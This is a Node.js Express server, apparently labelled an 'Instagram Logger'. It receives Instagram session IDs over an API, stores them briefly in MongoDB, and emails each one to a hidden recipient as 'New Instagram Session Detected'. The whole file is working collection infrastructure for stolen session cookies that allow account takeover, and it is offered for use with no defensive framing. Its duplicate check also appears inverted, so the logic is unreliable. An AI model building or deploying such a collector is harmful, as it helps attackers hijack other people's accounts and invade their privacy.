require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const nodemailer = require('nodemailer');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const dotenv = require("dotenv");
dotenv.config({ path: "./.env" });

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Rate limiting (5 requests per minute)
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 5,
  message: 'Too many requests'
});
app.use('/api/sessions', limiter);

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
});

// Session Model with TTL (auto-delete after 1 hour)
const sessionSchema = new mongoose.Schema({
  sessionId: { 
    type: String, 
    required: true,
    unique: true 
  },
  createdAt: { 
    type: Date, 
    default: Date.now,
    expires: 3600 // 1 hour in seconds
  }
});
const Session = mongoose.model('Session', sessionSchema);

// Email Transport
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

// API Endpoint
app.post('/api/sessions', async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: 'Session ID required' });
  }

  try {
    // Atomic operation: Insert if doesn't exist
    const newSession = await Session.findOneAndUpdate(
      { sessionId },
      { $setOnInsert: { sessionId } },
      { 
        upsert: true,
        new: false // Return the document before update
      }
    );

    // If document already existed
    if (newSession === null) {
      return res.status(200).json({ 
        sent: false,
        message: 'Duplicate session - already exists in database'
      });
    }

    // Send email for new sessions only
    await transporter.sendMail({
      from: `Instagram Logger <${process.env.EMAIL_USER}>`,
      to: process.env.RECIPIENT_EMAIL,
      subject: 'New Instagram Session Detected',
      text: `Session ID: ${sessionId}`,
      html: `<p>New session detected: <code>${sessionId}</code></p>`
    });

    res.status(200).json({ 
      sent: true,
      message: 'New session recorded and notification sent'
    });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});